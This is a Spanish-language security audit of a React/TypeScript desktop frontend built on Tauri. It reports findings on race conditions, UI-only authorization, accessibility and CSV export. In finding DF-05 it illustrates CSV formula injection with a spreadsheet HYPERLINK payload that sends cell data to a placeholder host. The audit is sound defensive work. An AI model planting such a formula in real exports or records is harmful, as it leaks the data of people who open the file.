# Auditoría 04 — Frontend de escritorio (React + TypeScript en Tauri)

Alcance: `desktop/src/**` (App.tsx, pantallas, componentes, api, contexto, nubeRealtime.ts, busqueda.ts, CSS), `desktop/package.json`, configuración de vite/ts/eslint y pruebas. Se contrastaron los contratos TS con `desktop/src-tauri/src/{comandos,dto}` y el núcleo `src/`. Fuera de alcance: `web/`, `web-visitas/`. Auditoría de solo lectura, fecha 2026-09-24, commit `372d93d`.

## Resumen ejecutivo

| Severidad | Cantidad |
|---|---|
| Crítica | 0 |
| Alta | 0 |
| Media | 9 |
| Baja | 10 |
| Info | 5 |

No hay hallazgos críticos ni altos. El frontend no tiene sinks de XSS (`dangerouslySetInnerHTML`, `innerHTML` y `eval` no aparecen, y `react/no-danger` es error de lint). La CSP de Tauri es estricta, solo `invoke()` desde `api/*` (se cumple la convención), no hay `any` y `localStorage` guarda solo preferencias de interfaz. Los problemas reales son de corrección funcional, carreras async en los modales, accesibilidad de modales y listas, y reglas de negocio que solo existen en el cliente.

**Top 5**
1. **DF-01**: el contrato TS↔Rust de `IngresoRemoto` está roto. Rust no serializa `placa`, así que en Activos un vehículo de otro dispositivo muestra "VEHÍCULO" en lugar de la placa.
2. **DF-02**: carreras de respuestas fuera de orden en los buscadores de `NuevoIngresoModal`/`GestionGafeteModal` y en `elegirContratista`. Se puede terminar con la ficha de un contratista distinto al último elegido, y el ingreso se registra a ese.
3. **DF-03**: el cambio obligatorio de contraseña (`debe_cambiar_password`) solo lo exige la UI. El backend deja la sesión activa antes del cambio.
4. **DF-04**: los modales no cumplen el patrón WAI-ARIA *dialog*: no hay `role="dialog"`, foco atrapado ni devolución de foco. Escape se escucha en `window`, así que cierra todos los modales apilados a la vez y además cierra el modal cuando el usuario solo quería cerrar la lista flotante.
5. **DF-05**: la exportación CSV no neutraliza fórmulas (CSV/Formula injection). Nombres y empresas que vienen de otros sitios o de la web se abren en Excel sin escapar.

Resultado de herramientas (resumen):
- `npx tsc --noEmit`: **0 errores** (exit 0).
- `npm run lint`: **0 errores, 56 advertencias**: 52 `react-refresh/only-export-components`, 1 `react-hooks/exhaustive-deps` (App.tsx:576) y 3 `react-hooks/incompatible-library` (uso de `watch()` de react-hook-form en FormularioContratista.tsx:80, FormularioRuta/FormularioEncargado y SalidaRutaModal.tsx:155). Hay además 1 supresión manual `eslint-disable-next-line react-hooks/exhaustive-deps` en App.tsx:446.
- `npx vitest run`: **45 archivos, 284 pruebas, todas en verde** (51 s).
- `npm audit --omit=dev`: **0 vulnerabilidades**. `npm audit` completo: 0.
- `npx knip`: 14 exports y 10 tipos exportados sin uso (detalle en DF-17). Se verificaron con grep.

---

## Hallazgos

### [DF-01] `IngresoRemoto` no incluye `placa` en el DTO Rust: la placa de los ingresos remotos nunca llega
- Severidad: Media
- Categoría: Bug / Acoplamiento (contrato TS↔Rust)
- Ubicación: `desktop/src-tauri/src/comandos/nube.rs:102-112` y `:435-452`; `desktop/src/api/nube.ts:102`; `desktop/src/api/activos.ts:60`; `desktop/src/pantallas/Activos.tsx:218-221`
- Estado: Nuevo
- Descripción y evidencia: el tipo TS declara `placa: string | null` y `filaDesdeRemoto` lo copia. El struct serializado `comandos::nube::IngresoRemoto` termina en `gafete_numero` y el `SELECT` de `listar_ingresos_remotos` no lee la columna, aunque la tabla la tiene desde la migración `ALTER TABLE ingresos_remotos ADD COLUMN placa TEXT` (schema.rs:4131) y el núcleo sí la trae (`nube::sincronizacion::IngresoRemoto.placa`, sincronizacion.rs:1778).
  ```rust
  pub struct IngresoRemoto { ... pub medio_ingreso: Option<String>, pub gafete_numero: Option<i64>, }  // sin placa
  ```
  En tiempo de ejecución `remoto.placa` vale `undefined`. `p.data.placa ?? null` lo convierte en `null` y `textoMedioConPlaca` cae a "VEHÍCULO". La prueba `api/activos.test.ts:49` construye el objeto a mano con `placa: "ABC123"`, así que no detecta la ruptura.
- Escenario de impacto: el celular del mismo sitio registra un vehículo con placa. En la grilla de Activos de la PC la columna Medio dice "VEHÍCULO" sin placa, y el operador del puesto de control no puede cotejar el vehículo que sale.
- Referencia externa: https://v2.tauri.app/develop/calling-rust/ (los argumentos y valores de retorno se serializan con serde; lo que no está en el struct no viaja)
- Recomendación: agregar `pub placa: Option<String>` al struct y `placa` al `SELECT`/`row.get(9)`. A mediano plazo, generar los tipos TS desde Rust (`ts-rs` o `specta`/`tauri-specta`) o agregar una prueba de contrato que serialice cada DTO y compare sus claves con las interfaces TS.

### [DF-02] Carreras async en los buscadores y en la selección de los modales de registro
- Severidad: Media
- Categoría: Bug
- Ubicación: `desktop/src/pantallas/NuevoIngresoModal.tsx:143-161` (búsqueda) y `:173-190` (`elegirContratista`); `desktop/src/pantallas/GestionGafeteModal.tsx:87-105`
- Estado: Nuevo
- Descripción y evidencia: el efecto de búsqueda cancela el *debounce*, pero no la promesa que ya está en vuelo, y el `.then` hace `setResultados` sin comprobar que la respuesta corresponda al filtro vigente:
  ```ts
  const id = setTimeout(() => {
    buscarContratistas({ texto: filtro }).then((pagina) => setResultados(pagina.items.slice(0, MAX_RESULTADOS)))
  ```
  `elegirContratista` espera `prepararIngreso` (comando async con un chequeo remoto de hasta N segundos en `comandos/ingresos.rs:117-133`) y al volver hace `setSeleccion({tipo:"formulario", contratista, preparacion})` sin verificar que siga siendo la selección actual. Si durante la espera el operador escribe (lo que pone la selección en "ninguna"), elige otro contratista con el mouse o pulsa "Cambiar", la respuesta vieja se impone.
- Escenario de impacto: el operador de portería elige a "Ana P." y corrige enseguida a "Ana Q.". La respuesta de Ana Q. llega primero y la de Ana P. después (el chequeo remoto tardó más). Queda en pantalla el formulario de Ana P., con su nombre, y Enter registra el ingreso de la persona equivocada. En la búsqueda, una respuesta lenta de "an" puede pisar la de "ana", y Enter elige al resaltado de una lista obsoleta. Las grillas ya resuelven esto con `useCargaAlCambiar` (contador de revisión); los modales no lo usan.
- Referencia externa: https://react.dev/reference/react/useEffect#fetching-data-with-effects (bandera `ignore` para evitar *race conditions*); https://react.dev/learn/you-might-not-need-an-effect#fetching-data
- Recomendación: en el efecto de búsqueda, usar `let ignorar = false` y `return () => { ignorar = true; clearTimeout(id) }`. En `elegirContratista`, guardar un `useRef` con un contador o el id elegido y descartar la respuesta si ya cambió. Deshabilitar la lista mientras `seleccion.tipo === "cargando"`. Agregar una prueba con `@testing-library/react` y promesas diferidas.

### [DF-03] El cambio obligatorio de contraseña solo lo impone la UI
- Severidad: Media
- Categoría: Seguridad
- Ubicación: `desktop/src/pantallas/Login.tsx:153-174`; backend `desktop/src-tauri/src/comandos/autenticacion.rs:294-327`
- Estado: Nuevo
- Descripción y evidencia: `login` ejecuta `state.iniciar_sesion(identidad)`, cachea el hash local y lanza la sincronización antes de devolver `debe_cambiar_password: true`. La única barrera es que `Login.tsx` muestra `PasoCambioObligatorio` en vez de llamar a `onAutenticado`. Ningún comando Tauri consulta ese flag: todos los `state.sesion_activa()?` pasan. Además, el cacheo del login offline (`cachear_password_local`) guarda la contraseña temporal, que sirve para entrar sin conexión aunque nunca se haya cambiado.
- Escenario de impacto: quien tenga la contraseña temporal de un solo uso (por ejemplo, la vio al entregarla el administrador) puede operar con ella indefinidamente de dos formas. Offline, entra con el caché local, que no se vuelve a evaluar contra Supabase. Con acceso al webview (build con devtools o un XSS futuro), puede invocar cualquier comando con la sesión ya iniciada. El requisito de "fijar contraseña antes de operar" queda sin efecto.
- Referencia externa: https://owasp.org/www-project-application-security-verification-standard/ (ASVS V2.1 / V6 — los controles de autenticación se aplican en el lado de confianza); https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- Recomendación: en Rust, marcar la sesión como "pendiente de cambio" y hacer que `sesion_activa()` rechace todo salvo `cambiar_password_supabase`/`cerrar_sesion` mientras siga pendiente. No cachear la contraseña temporal para el modo offline.

### [DF-04] Accesibilidad de `Modal`: sin semántica de diálogo ni foco atrapado, y Escape global cierra todos los modales apilados
- Severidad: Media
- Categoría: Accesibilidad / Bug
- Ubicación: `desktop/src/componentes/Modal.tsx:31-37, 54-95`; `desktop/src/App.tsx:493-499`
- Estado: Nuevo
- Descripción y evidencia:
  - El contenedor es un `<div>` sin `role="dialog"`, `aria-modal="true"` ni `aria-labelledby` que apunte al `<h2>`. El botón de cerrar es `✕`, sin `aria-label`.
  - No hay foco atrapado: Tab sale del modal hacia la grilla y el sidebar que quedan detrás, que siguen interactivos. Al cerrar, el foco no vuelve al disparador.
  - `window.addEventListener("keydown", …Escape → onCerrar)`: con dos modales abiertos, por ejemplo `CambiarPasswordModal` sobre un modal del Shell, o `SalidaModal` abierto con Ctrl+S (App.tsx:494) mientras `NuevoIngresoModal` está abierto y el foco está en un botón, ambos listeners se disparan y Escape cierra todos a la vez.
  - Escape con la `ListaFlotante` abierta no cierra la lista: cierra el modal entero y descarta lo escrito, contra la intención declarada en el propio doc-comment ("no debe descartar en silencio lo que ya se escribió").
  - Los atajos globales (`ctrl+n`, `ctrl+s`, `ctrl+q`) siguen activos con un modal abierto. Ctrl+Q cierra la sesión en medio de un registro, sin confirmación.
- Escenario de impacto: un usuario de teclado o lector de pantalla no sabe que está dentro de un diálogo. En la portería, pulsar Escape para cerrar la lista de resultados borra el formulario de ingreso a medio llenar.
- Referencia externa: https://www.w3.org/WAI/ARIA/apg/patterns/dialog-modal/ ; https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog
- Recomendación: usar `<dialog>` con `showModal()`, que da foco atrapado, capa superior y `inert` en el fondo, o añadir `role="dialog" aria-modal aria-labelledby`, un foco atrapado y la restauración del foco. Manejar Escape en el propio nodo (`onKeyDown` + `stopPropagation`) en lugar de en `window`. Que las listas flotantes consuman primero el Escape. Desactivar los hotkeys del Shell mientras haya un modal abierto (`enabled: !modalAbierto` o el `scopes` de react-hotkeys-hook).

### [DF-05] CSV exportado sin neutralizar fórmulas (CSV injection)
- Severidad: Media
- Categoría: Seguridad
- Ubicación: `desktop/src/componentes/Tabla.tsx:427-461` (`api.getDataAsCsv`); backend `comandos/exportacion.rs:30-37`
- Estado: Nuevo
- Descripción y evidencia: el CSV lo arma AG Grid 36.2 (`CsvSerializingSession.putInQuotes`, `node_modules/ag-grid-community/dist/package/main.esm.mjs:39835`), que solo escapa las comillas dobles. No añade prefijo a los valores que empiezan por `=`, `+`, `-`, `@`, tabulador o CR. El backend le agrega un BOM para Excel. Los datos exportados (nombre, empresa, placa, cédula de proveedor) llegan de otros dispositivos, del panel web o de la cola de sincronización. La cédula y el nombre de proveedor no tienen validación de formato (`IngresoProveedorModal.tsx:212-213`; núcleo solo `trim().is_empty()`). En cambio, el XLSX (`write_string_with_format`) sí es seguro.
- Escenario de impacto: alguien registra como proveedor el nombre `=HYPERLINK("http://x/?"&A2,"ver")`, o un valor que se sincroniza desde otro sitio. El supervisor exporta el historial a CSV y lo abre en Excel: la celda se evalúa como fórmula, con posible exfiltración de datos o DDE en versiones sin endurecer.
- Referencia externa: https://owasp.org/www-community/attacks/CSV_Injection
- Recomendación: pasar `processCellCallback` a `getDataAsCsv` para anteponer `'` a los valores que empiezan por `= + - @ \t \r`, o armar el CSV en Rust con la misma neutralización.

### [DF-06] Regla de gafete duplicado entre dispositivos y "ya está adentro": solo avisos en el cliente
- Severidad: Media
- Categoría: Seguridad / Bug (validación solo en cliente)
- Ubicación: `desktop/src/pantallas/IngresoProveedorModal.tsx:234, 367-371`; `EntregarGafeteProvisionalModal.tsx:261-266`; `SalidaModal.tsx:88-94`
- Estado: Pendiente de auditoría previa (`docs/pendientes.md`, "El chequeo cross-device de 'gafete ya ocupado en el sitio' no está conectado en escritorio", 2026-09-17). Se confirma que sigue abierto para proveedores y KOF. Contratistas ya lo tiene en `registrar_ingreso` (`gafete_libre_en_otro_dispositivo`).
- Descripción y evidencia: el modal de proveedor muestra "⚠ Ya está adentro con el gafete #NN" usando `listarTodosLosProveedoresActivos`, que incluye los remotos, pero no bloquea. El backend (`IngresoProveedorService::registrar_ingreso`) solo revisa el ingreso activo local. En `SalidaModal`, `porGafete` es un `Map<number, FilaActiva>`: si el mismo número está activo en una fila local y en una remota (precisamente el caso que no se bloquea), gana la última y se da salida a la persona equivocada.
- Escenario de impacto: dos PCs del mismo punto de acceso entregan el gafete 12. Al registrar la salida "por gafete 12", se cierra el ingreso de otra persona sin aviso.
- Referencia externa: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html (validar del lado del servidor)
- Recomendación: conectar `gafete_de_proveedor_ocupado_en_sitio` y `gafete_provisional_ocupado_en_sitio` en los comandos. En `SalidaModal`, agrupar `Map<number, FilaActiva[]>` y exigir desambiguar cuando haya más de una coincidencia.

### [DF-07] Columna "Acceso" oculta por rol solo en la UI
- Severidad: Media
- Categoría: Seguridad (control de acceso solo en UI)
- Ubicación: `desktop/src/pantallas/Contratistas.tsx:31-36, 69-79`; `FormularioContratista.tsx:374-379`
- Estado: Pendiente de auditoría previa (`docs/pendientes.md`, "RBAC de la GUI de escritorio no está realmente aplanado para Operador", 2026-09-15). Sigue abierto en su vertiente de "restricción solo visual".
- Descripción y evidencia: el propio comentario lo admite: "El núcleo todavía no lo exige (cualquier rol autenticado puede llamar `actualizarContratista` igual) -- esto es sólo la UI". Además, `FormularioContratista` sigue mostrando el checkbox "Con acceso" a un Operador, así que el ocultamiento en la grilla no evita que lo cambie por doble clic.
- Escenario de impacto: un Operador de la portería rehabilita a un contratista vetado desde el formulario de edición, sin pasar por el panel web al que se delegó esa decisión.
- Referencia externa: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- Recomendación: decidir la política. Si se delega en los administradores, rechazar en `ContratistaService::actualizar` los cambios de `tiene_acceso` hechos por Operador y ocultar también el checkbox del formulario. Si la política es "aplanado", borrar el gate visual y el comentario engañoso.

### [DF-08] Fallos permanentes de sincronización sin UI (`fallosPermanentesNube` nunca se llama)
- Severidad: Media
- Categoría: Código muerto / Bug funcional
- Ubicación: `desktop/src/api/nube.ts:195-199`; comando `fallos_permanentes_nube` (`comandos/nube.rs:414-419`)
- Estado: Nuevo
- Descripción y evidencia: el comentario dice "Filas de la cola que ya agotaron los reintentos automáticos y quedaron `fallido` de forma permanente -- necesitan que alguien las mire". Ni knip ni grep encuentran consumidores: el único uso es la definición. El resumen de "Sincronizar" solo reporta los `fallidos` del intento actual.
- Escenario de impacto: un ingreso rechazado de forma definitiva por la nube (conflicto o RLS) nunca llega a Supabase y nadie se entera. El historial central queda incompleto en silencio.
- Referencia externa: https://react.dev/learn/synchronizing-with-effects (consultar un estado externo al montar)
- Recomendación: consultar `fallosPermanentesNube` en `BarraNube` tras cada `onSincronizado` y mostrar un indicador o toast persistente si el conteo es mayor que 0.

### [DF-09] Huecos de pruebas en la lógica crítica de los modales y del contrato
- Severidad: Media
- Categoría: Pruebas
- Ubicación: `desktop/src/pantallas/*Modal.test.ts`, `desktop/src/App.tsx` (sin pruebas)
- Estado: Nuevo
- Descripción y evidencia: de 45 archivos de prueba, solo 11 renderizan componentes, y ninguno es un modal de registro. `NuevoIngresoModal.test.ts`, `SalidaModal.test.ts`, `IngresoProveedorModal.test.ts` y `EntregarGafeteProvisionalModal.test.ts` prueban solo funciones puras (`validarGafete`, `avisosContratista`, `filtrarEncargados`…). Falta cubrir: el flujo buscar→elegir→registrar, el doble envío, las carreras de DF-02, la salida por gafete con números duplicados (DF-06), la expulsión de sesión y el refresco del Shell (App.tsx:509-576) y el contrato con los DTO Rust (DF-01, que pasó sin detectarse porque el fixture se escribe a mano).
- Escenario de impacto: las regresiones en el flujo principal de la portería (registrar ingreso o salida) solo se detectan en uso real.
- Referencia externa: https://testing-library.com/docs/react-testing-library/intro/ ; https://vitest.dev/guide/mocking
- Recomendación: pruebas de integración con `@testing-library/react` + `user-event` (ya está `@testing-library/react`) mockeando `@tauri-apps/api/core` (`mockIPC` de `@tauri-apps/api/mocks`), y una prueba de contrato generada desde Rust.

### [DF-10] Recargas de grillas sin descartar respuestas viejas (Activos, Proveedores, KOF, Visitas, Rutas)
- Severidad: Baja
- Categoría: Bug
- Ubicación: `desktop/src/pantallas/Activos.tsx:121-145`; `Proveedores.tsx:99-124`; `GafetesProvisionales.tsx:113-138`; `Visitas.tsx:106-113`; `Rutas.tsx:36-52`
- Estado: Nuevo
- Descripción y evidencia: `vigente` solo protege el `toast.error`. `setFilas`/`setCargando` se ejecutan igual con respuestas viejas. `refrescarSenal` puede subir varias veces seguidas (Realtime + pulso + registro), y en Proveedores y KOF un único `cargando` es compartido por las dos vistas: la vista de historial puede quedar en "Cargando…" o apagarse antes de tiempo según qué petición termine primero. Además, `recargar()` en Activos limpia `seleccionadas` en cada refresco de Realtime, lo que borra una selección múltiple en curso.
- Escenario de impacto: con dos sincronizaciones seguidas, la grilla muestra por un instante un estado anterior. El operador que marcaba varias filas para la salida masiva pierde la selección cuando llega un aviso de otro dispositivo.
- Referencia externa: https://react.dev/reference/react/useEffect#fetching-data-with-effects
- Recomendación: reutilizar `useCargaAlCambiar` (contador de revisión) en estas pantallas, separar `cargandoActivos`/`cargandoHistorial` y conservar la selección por `claveFilaActiva` en lugar de vaciarla.

### [DF-11] Expulsión de sesión procesada dos veces y efecto con dependencias incompletas
- Severidad: Baja
- Categoría: Mala práctica / Bug
- Ubicación: `desktop/src/App.tsx:553-576`, `:281-283`, `:442-447`
- Estado: Nuevo
- Descripción y evidencia: la misma sincronización llega por dos caminos: `iniciarRealtimeNube.onSincronizado` y el evento Tauri `nube://sincronizado`. Con `sesion_expulsada` se ejecuta `onCerrarSesion()` dos veces, con dos toasts y dos `cerrar_sesion`. El efecto depende de `[sesion.id]` pero captura `manejarResumenSincronizacion`, `onCerrarSesion`, `sesion.cedula` y `sesion.nombre` (advertencia de lint `exhaustive-deps`). El efecto de App.tsx:442 suprime la regla a mano.
- Escenario de impacto: avisos duplicados. Si en el futuro `onCerrarSesion` deja de ser idempotente, la sesión se cerrará dos veces.
- Referencia externa: https://react.dev/learn/separating-events-from-effects (`useEffectEvent`, estable en React 19.2)
- Recomendación: envolver el manejador en `useEffectEvent`, añadir una bandera `cerrandoRef` en `onCerrarSesion` y eliminar el `eslint-disable`.

### [DF-12] `ListaFlotante`/buscadores sin semántica ARIA de combobox
- Severidad: Baja
- Categoría: Accesibilidad
- Ubicación: `desktop/src/componentes/ListaFlotante.tsx:234-326`; usos en NuevoIngresoModal, SalidaModal, IngresoProveedorModal, EntregarGafeteProvisionalModal y GestionGafeteModal
- Estado: Nuevo
- Descripción y evidencia: el input no tiene `role="combobox"`, `aria-expanded`, `aria-controls` ni `aria-activedescendant`. La lista (un portal a `body`) es un `div` con `button`s sin `role="listbox"`/`option`/`aria-selected`. El resaltado con flechas es solo visual. `FormularioGafete.tsx:175-188` usa `role="radio"` en botones sin *roving tabindex* ni navegación con flechas.
- Escenario de impacto: un lector de pantalla no anuncia los resultados ni cuál está resaltado.
- Referencia externa: https://www.w3.org/WAI/ARIA/apg/patterns/combobox/ ; https://www.w3.org/WAI/ARIA/apg/patterns/radio/
- Recomendación: aplicar el patrón combobox + listbox en `ListaFlotante`/`useNavegacionFlechas` (un solo lugar) y el *roving tabindex* en `opciones-tarjeta`.

### [DF-13] `useListaFlotante` mide el layout en cada cuadro mientras la lista está visible
- Severidad: Baja
- Categoría: Rendimiento
- Ubicación: `desktop/src/componentes/ListaFlotante.tsx:167-192` (commit `3e2f8e4`)
- Estado: Nuevo
- Descripción y evidencia: el bucle `requestAnimationFrame` llama a `getBoundingClientRect()` unas 60 veces por segundo durante todo el tiempo que la lista está abierta. Eso fuerza un layout síncrono en cada cuadro, incluso sin ninguna animación, y lo mismo aplica a los popovers de `Tabla`, `MenuUsuario` y `SelectorRangoFecha`. El `setPosicion` está bien condicionado, así que no provoca re-renders, pero el costo de layout es constante.
- Escenario de impacto: CPU y batería innecesarias en PCs modestas de la portería con un popover abierto. No es grave.
- Referencia externa: https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver ; https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing
- Recomendación: medir solo mientras dure la transición de alto (`transitionrun`/`transitionend` sobre `.modal-cuerpo`) o con `ResizeObserver` sobre el cuerpo del modal más `scroll`/`resize`, y detener el bucle cuando la posición se mantenga estable N cuadros.

### [DF-14] Tope de 200 en la creación de rangos de gafetes solo en el cliente
- Severidad: Baja
- Categoría: Seguridad (validación solo en cliente)
- Ubicación: `desktop/src/pantallas/FormularioGafete.tsx:56-62`; núcleo `src/services/gafete_service.rs:67-79`
- Estado: Nuevo
- Descripción y evidencia: el esquema zod rechaza rangos mayores a 200, pero `GafeteService::crear_rango` solo valida `desde <= 0 || hasta < desde` y crea en una sola transacción, encolando cada gafete (`cola_salida::encolar`) para Supabase.
- Escenario de impacto: una invocación directa (o un error futuro del cliente) con `hasta = 10^7` bloquea la base con una transacción inmensa y llena la cola de sincronización.
- Referencia externa: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- Recomendación: repetir el tope en `crear_rango` (y en `crear_rutas_rango`).

### [DF-15] Carga sin acotar del historial completo de proveedores al abrir el modal
- Severidad: Baja
- Categoría: Rendimiento
- Ubicación: `desktop/src/pantallas/IngresoProveedorModal.tsx:115-117`
- Estado: Nuevo
- Descripción y evidencia: `listarHistorialIngresosProveedorSitio()` se llama sin `desde`/`hasta`, así que trae toda la caché `historial_ingresos_proveedor_sitio`, sin tope `CargaCompleta`, cada vez que se abre el modal. Solo se usa para deducir los "proveedores conocidos".
- Escenario de impacto: con años de historial, abrir el modal se vuelve lento y transfiere miles de filas por IPC.
- Referencia externa: https://v2.tauri.app/concept/inter-process-communication/
- Recomendación: un comando dedicado `proveedores_conocidos(texto, limite)` con `DISTINCT` por cédula en SQL, o al menos pasar `desde = fechaHaceMeses(12)`.

### [DF-16] `diasHasta` redondea con `Math.ceil` sobre milisegundos
- Severidad: Info
- Categoría: Bug (fechas/zona horaria)
- Ubicación: `desktop/src/api/ingresos.ts:132-137`
- Estado: Nuevo
- Descripción y evidencia: `Math.ceil((objetivo - hoy)/86_400_000)`. En zonas con horario de verano, un día de 25 h da un día de más. Costa Rica no tiene horario de verano, así que hoy no afecta.
- Escenario de impacto: solo si se instala en una zona con DST ("vence en 4 días" cuando son 3).
- Referencia externa: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date#time_values_and_timestamps
- Recomendación: calcular con `Date.UTC(y,m,d)` en ambos extremos, o reutilizar `fechaYMD` y restar días de calendario.

### [DF-17] Código muerto: exports, comandos y tipos sin uso
- Severidad: Baja
- Categoría: Código muerto
- Ubicación: varias (verificado con knip + grep)
- Estado: Nuevo
- Descripción y evidencia:
  - `api/usuarios.ts:11` `cambiarMiPassword` y el comando Rust `cambiar_mi_password`: el propio `CambiarPasswordModal.tsx:31` dice que no se debe usar porque desincroniza la contraseña local y la de Supabase. Es una API peligrosa que sigue expuesta al webview.
  - El comando `buscar_encargados_ruta_provisional` está registrado en `lib.rs:556` y ningún código del frontend lo invoca.
  - Sin consumidores: `api/rutas.ts:208` `buscarSalidaRuta`, `api/empresas.ts:28` `listarEmpresas`, `api/proveedores.ts:44` `listarEmpresasProveedor`, `TIPOS_INGRESO`, `MEDIOS_INGRESO`, `fallosPermanentesNube` (ver DF-08), la reexportación `EVENTO_NUBE_ACTUALIZADA` en `nubeRealtime.ts:7`, `posicionParaCampo` (solo pruebas) y los `esquema` de FormularioRuta/Encargado/Vehiculo/EmpresaProveedor.
  - El barrel `api/index.ts` no reexporta `proveedores` ni `gafetesProvisionales`, lo que da dos estilos de import.
  - Comentarios desactualizados: `ErrorBoundary.tsx:14-17` (menciona `key={seccion}`, eliminado) y `App.tsx:817-820` ("sin toggle manual todavía", cuando `SelectorTema` existe). `Toaster theme="system"` no sigue el tema elegido, aunque está compensado por las variables `!important` de index.css.
  - `plegar` está duplicado en `Tabla.tsx:54` y `busqueda.ts:6`, con distinto sentido de mayúsculas.
  - Clases CSS `boton-compacto`, `boton-discreto` y `boton-peligro` (`controles.css`) sin uso en desktop. El archivo se comparte con web, así que antes de borrarlas hay que verificar allí.
- Escenario de impacto: superficie IPC innecesaria (`cambiar_mi_password`) y confusión al mantener el código.
- Referencia externa: https://knip.dev/ ; https://v2.tauri.app/security/capabilities/ (reducir la superficie expuesta)
- Recomendación: eliminar `cambiar_mi_password` y `buscar_encargados_ruta_provisional` de `generate_handler!` y sus wrappers TS, y borrar los exports listados. Añadir `knip` al CI.

### [DF-18] Salida individual desde la grilla sin protección contra doble clic
- Severidad: Baja
- Categoría: Bug
- Ubicación: `desktop/src/pantallas/Activos.tsx:152-162, 282-293`; `Proveedores.tsx:126-136, 173-185`; `GafetesProvisionales.tsx:140-150`
- Estado: Nuevo
- Descripción y evidencia: el botón "Salida" de cada fila no se deshabilita mientras `cerrarFilaActiva` está en vuelo. Los formularios de los modales sí usan `disabled={enviando}`; en el botón de la fila, un doble clic dispara dos `registrar_salida`/`cerrar_ingreso_remoto`. El backend rechaza el segundo en el caso local ("sin ingreso activo"), así que el efecto es un toast de error confuso. En el caso remoto depende de la idempotencia de la nube.
- Escenario de impacto: aparece un error rojo después de una salida que sí se registró, y el operador duda si la salida quedó.
- Referencia externa: https://react.dev/reference/react-dom/components/form (estado pendiente y deshabilitar el envío)
- Recomendación: un `Set` de claves en proceso (`claveFilaActiva`) que deshabilite el botón de esa fila.

### [DF-19] `guardar_csv` y los exportadores escriben en cualquier ruta que envíe el webview
- Severidad: Baja
- Categoría: Seguridad (defensa en profundidad)
- Ubicación: `desktop/src/api/exportacion.ts:15-41`; `comandos/exportacion.rs:30-37`
- Estado: Nuevo
- Descripción y evidencia: `destino` viene del diálogo `save()`, pero el comando acepta cualquier cadena y hace `std::fs::write(&destino, …)`. No se verifica que la ruta sea la que eligió el usuario en el diálogo. Hoy no hay vector de XSS (CSP estricta, sin sinks), así que el riesgo es teórico.
- Escenario de impacto: si alguna vez aparece un XSS (por ejemplo, un `cellRenderer` que interprete HTML sincronizado), el atacante obtiene escritura arbitraria de archivos con los permisos del usuario.
- Referencia externa: https://v2.tauri.app/security/ ; https://v2.tauri.app/plugin/dialog/
- Recomendación: abrir el diálogo desde Rust (`tauri_plugin_dialog` en el propio comando) o validar la extensión y rechazar rutas de sistema.

### [DF-20] Token de Realtime y apikey expuestos al webview (correcto por diseño, con matices)
- Severidad: Info
- Categoría: Seguridad
- Ubicación: `desktop/src/nubeRealtime.ts:125-185`; `comandos/nube.rs:395-409`; `src/nube/mod.rs:77`
- Estado: Nuevo (verificación)
- Descripción y evidencia: el webview recibe `apikey` = `sb_publishable_…` (clave publicable, apta para el cliente) y el `access_token` de dispositivo de corta duración, nunca el secreto del dispositivo. El canal es `private: true` y se renueva antes de `expires_in` (`Math.max(60, expires_in-60)`). Nada se guarda en `localStorage` (`persistSession:false`). `track()` envía la cédula y el nombre del usuario al canal de presencia del sitio: es un dato personal visible para todos los suscriptores del tópico, con los que se debe revisar que RLS de `realtime.messages` limite la presencia a dispositivos del mismo sitio (ya verificado en `docs/auditorias/realtime-verificado.md`).
- Escenario de impacto: ninguno con la configuración actual.
- Referencia externa: https://supabase.com/docs/guides/api/api-keys ; https://supabase.com/docs/guides/realtime/authorization
- Recomendación: mantener. Considerar enviar solo `usuario_id` global en lugar de la cédula en la presencia.

### [DF-21] App.tsx como orquestador grande
- Severidad: Info
- Categoría: Acoplamiento
- Ubicación: `desktop/src/App.tsx` (827 líneas)
- Estado: Nuevo
- Descripción y evidencia: `Shell` concentra el enrutamiento por `id === …` en un ternario de 11 ramas (App.tsx:719-745), la persistencia del sidebar, los hotkeys, Realtime, el updater, la sincronización manual, la barra de estado y los modales globales. Sí respeta las convenciones (ninguna pantalla importa a otra, `invoke` solo en `api/`).
- Escenario de impacto: cada sección nueva toca el mismo archivo, y hay riesgo de efectos cruzados (DF-11).
- Referencia externa: https://react.dev/learn/reusing-logic-with-custom-hooks
- Recomendación: extraer `useSincronizacionNube`, `useActualizaciones` y `usePreferenciasSidebar`, y un mapa `Record<Seccion, ComponentType>` en lugar del ternario.

### [DF-22] Advertencias de lint sin gestionar
- Severidad: Info
- Categoría: Mala práctica
- Ubicación: 52 × `react-refresh/only-export-components`; 3 × `react-hooks/incompatible-library` (`watch()` en FormularioContratista.tsx:80, SalidaRutaModal.tsx:155 y otro formulario)
- Estado: Nuevo
- Descripción y evidencia: el patrón de exportar funciones puras desde los `.tsx` (para probarlas) genera ruido permanente de lint. `watch()` impide que el React Compiler memoice el componente. `FormularioGafete` ya migró a `useWatch`.
- Escenario de impacto: las advertencias reales (como la de DF-11) quedan ocultas entre las demás.
- Referencia externa: https://react-hook-form.com/docs/usewatch
- Recomendación: mover las funciones puras a `*.logica.ts` y usar `useWatch` en los tres formularios restantes. Hacer que el lint falle con advertencias (`--max-warnings 0`).

### [DF-23] Pantallas en pausa (Visitas, Rutas, Catálogo KOF): mismos patrones
- Severidad: Info
- Categoría: Mala práctica
- Ubicación: `pantallas/Visitas.tsx:106-128`, `Rutas.tsx:36-60`, `VisitaCheckInModal.tsx:85-106`, `SalidaRutaModal.tsx:255,363`
- Estado: Nuevo
- Descripción y evidencia: tienen las mismas carreras de recarga que DF-10. `VisitaCheckInModal.verificar` no descarta una respuesta vieja si la cédula cambió mientras se verificaba (`cambiarCedula` vuelve a "buscando" y la respuesta posterior la sobrescribe). `SalidaRutaModal` usa `setTimeout` en `onBlur` sin limpiarlo. Lo de "ya está adentro" en visitas es un filtro de UI; el backend lo repite, así que la regla está cubierta.
- Escenario de impacto: bajo mientras estén ocultas (`SECCIONES_EN_DESARROLLO`), pero conviene corregirlo antes de reactivarlas.
- Referencia externa: https://react.dev/reference/react/useEffect#fetching-data-with-effects
